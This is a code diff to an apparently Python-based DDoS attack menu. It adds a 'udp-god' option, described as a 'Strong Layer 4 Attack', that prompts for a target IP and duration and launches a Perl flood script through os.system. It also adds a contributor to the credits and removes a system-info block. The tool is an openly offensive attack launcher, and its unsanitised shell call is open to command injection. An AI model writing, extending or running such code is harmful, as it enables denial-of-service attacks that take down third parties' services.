@@ -23,20 +23,6 @@ speedtestbaba = (f"Download speed: \n{downspeed} Mb/s\nUpload speed:\n{upspeed} 
 
 
 
-machine = platform.machine()
-systemos = platform.system()
-
-pyshicalcores = psutil.cpu_count(logical=False)
-logicalcores = psutil.cpu_count(logical=True)
-
-totalram = f"{round(psutil.virtual_memory().total/1000000000, 2)} GB"
-avaliableram = f"{round(psutil.virtual_memory().available/1000000000, 2)} GB"
-usedram = f"{round(psutil.virtual_memory().used/1000000000, 2)} GB"
-ramusagepercent = f"{psutil.virtual_memory().percent}%"
-
-
-hostname = socket.gethostname()
-ip_address = socket.gethostbyname(hostname)
 
 
 os.system('clear')
@@ -209,7 +195,7 @@ def load():
 
 
 \033[1m\033[31m⮞ \033[31mMethod \033[0m\033[31mDev\033[96m'\033[31ms\033[96m:\033[0m
-\033[96m\033[1mMhProDev \033[0m\033[31m, \033[96mGoogleAdmin
+\033[96m\033[1mMhProDev \033[0m\033[31m, \033[96mGoogleAdmin \033[31m, \033[96m Cocorisss
 \033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m \033[96m,\033[0m \033[31mLeeon123 \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  
 
 """
@@ -289,6 +275,7 @@ def wrongoption():
 \033[32m\033[1m# \033[0mGoogleAdmin
 \033[32m\033[1m# \033[0memp001
 \033[32m\033[1m# \033[0mLeeon123
+\033[32m\033[1m# \033[0mCocorisss
 
 {indicatorlogo} WRONG OPTION"""
         print(str(developer))
@@ -695,7 +682,23 @@ def menu():
                     license()
                     menu()
 
+                if menuoption == "udp-god":
+                    os.system('clear')
+                    load()
+                    print("""
+\033[36m[\033[39mMETHODS\033[36m]\033[0m
 
+\033[31m\033[1m⮞ \033[0m\033[39mudp-god \033[31m: \033[36m Strong Layer 4 Attack \033[31m[\033[32mRUNNING\033[31m]\033[0m
+
+            """)
+                    udpIP = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
+                    udpTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
+                    sendUDP = (f'perl cocorisss.pl {udpIP} {udpTIME}')
+                    tip()
+                    os.system(sendUDP)
+                    load()
+                    license()
+                    menu()
                 if menuoption == "ultra-bypass":
                     os.system('clear')
                     load()
@@ -799,6 +802,23 @@ def menu():
                     wrongoption()
                     license()
                     menu()
+            if kies == "udp-god":
+                os.system('clear')
+                load()
+                print("""
+\033[36m[\033[39mMETHODS\033[36m]\033[0m
+
+\033[31m\033[1m⮞ \033[0m\033[39mudp-god \033[31m: \033[36m Strong Layer 4 Attack \033[31m[\033[32mRUNNING\033[31m]\033[0m
+
+            """)
+                udpIP = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
+                udpTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
+                sendUDP = (f'perl cocorisss.pl {udpIP} {udpTIME}')
+                tip()
+                os.system(sendUDP)
+                load()
+                license()
+                menu()
             if kies == "mh-projectshield":
                 load()
                 print("""
